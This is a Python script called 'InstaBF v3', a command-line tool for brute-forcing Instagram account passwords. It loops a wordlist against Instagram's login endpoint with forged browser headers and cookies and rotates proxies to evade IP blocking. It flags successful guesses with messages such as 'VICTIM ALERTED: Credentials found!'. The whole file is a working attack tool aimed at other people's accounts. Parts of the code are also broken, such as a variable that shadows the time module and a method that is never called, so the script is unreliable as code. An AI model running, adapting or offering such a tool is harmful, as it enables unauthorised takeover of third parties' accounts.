import requests
import os
import sys
import random
import time
from datetime import datetime
from colorama import Fore

wordlist = 'None'
proxies = 'None'
username = 'None'

def clear():
    if os.name == 'nt':
        _ = os.system('cls')
    else:
        _ = os.system('clear')

titlescreen = """
InstaBF v3
"""

def login(username, password, proxy):
    #initialilzing cookies for request
    cookies = {
        'csrftoken': '9e7U8qRNqAbazRC0kwrRgyN2okh1kihx',
        'mid': 'YsM1_AALAAEG2fGCvkPXE5DVlJD0',
        'ig_did': '494394E2-A583-4F01-BC32-5E4344FE2C4D',
    }

    #sets proxies
    proxies={"http": proxy, "https": proxy}

    #headers for request
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'X-CSRFToken': '9e7U8qRNqAbazRC0kwrRgyN2okh1kihx',
        'X-Instagram-AJAX': 'c6412f1b1b7b',
        'X-IG-App-ID': '936619743392459',
        'X-ASBD-ID': '198387',
        'X-IG-WWW-Claim': '0',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://www.instagram.com',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Referer': 'https://www.instagram.com/accounts/login/?',
        # Requests sorts cookies= alphabetically
        # 'Cookie': 'csrftoken=9e7U8qRNqAbazRC0kwrRgyN2okh1kihx; mid=YsM1_AALAAEG2fGCvkPXE5DVlJD0; ig_did=494394E2-A583-4F01-BC32-5E4344FE2C4D',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        # Requests doesn't support trailers
        # 'TE': 'trailers',
    }

    #gets current time for encrypted password
    time = int(datetime.now().timestamp())

    proxies={"http": proxy, "https": proxy}

    #payload data
    data = {
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
        'username': username,
        'queryParams': '{}',
        'optIntoOneTap': 'false',
        'stopDeletionNonce': '',
        'trustedDeviceRecords': '{}',
    }
    print(Fore.LIGHTCYAN_EX+"Trying username: "+username+" password: "+password)
    response = requests.post('https://www.instagram.com/accounts/login/ajax/', cookies=cookies, headers=headers, data=data, proxies=proxies)
    data = str(response.text)
    if '"status":"fail"' in data:
        print(Fore.LIGHTRED_EX+"IP black listed, change VPN locations")
        sys.exit()
    if '"authenticated":true' in data:
        print(Fore.LIGHTGREEN_EX+"Credentials found! "+username+" "+password)
        sys.exit()
    if '"checkpoint_url"' in data:
        print(Fore.LIGHTGREEN_EX+"VICTIM ALERTED: Credentials found! "+username+" "+password)
        sys.exit()
    if '"spam":true' in data:
        print(Fore.LIGHTRED_EX+"Spam detected!")
        sys.exit()
    if '"Please wait a few minutes before' in data:
        print(Fore.LIGHTRED_EX+"Waiting...")
        time.sleep(180)

def start():
    global username
    global proxies
    global wordlist
    clear()
    print(titlescreen)
    print("==========================")
    print("[1] Username: "+username)
    print("[2] Wordlist: "+wordlist)
    print("[3] Proxies: "+proxies)
    print("[0] Start attack")
    print("==========================")
    user_in = input("Input: ")
    #sets username
    if user_in == "1":
        clear()
        username = input("Username: ")
        start()
    #sets wordlist and checks wordlist to see if it exists
    if user_in == "2":
        clear()
        wordlist = input("Wordlist: ")
        if os.path.exists(wordlist) == False:
            print("Wordlist not found, try again")
            wordlist = "None"
            time.sleep(2)
            start()
        start()
    #sets proxies
    if user_in == "3":
        clear()
        proxies = input("Proxy file: ")
        if os.path.exists(proxies) == False:
            print("Proxy file not found, try again")
            proxies = "None"
            time.sleep(2)
            start()
        #counts number of proxies
        file = open(proxies,"r")
        proxylimit = 0
        Content = file.read()
        CoList = Content.split("\n")
        for i in CoList:
            if i:
                proxylimit += 1
        start()
    if user_in == "0":
        passwordlist = open(wordlist, 'r').read().splitlines()
        proxynumber = 0
        for password in passwordlist:
            if proxies == "None":
                login(username=username, password=password, proxy=None)
            else:
                if proxynumber == proxylimit:
                    proxy = None
                    proxynumber = 0
                else:
                    proxylist = open(proxies, 'r').read().splitlines
                    proxy = (proxylist[proxynumber])
                    proxynumber += 1
                    login(username=username, password=password, proxy=proxy)

                login(username=username, password=password, proxy=proxy)

if __name__ == "__main__":
    start()
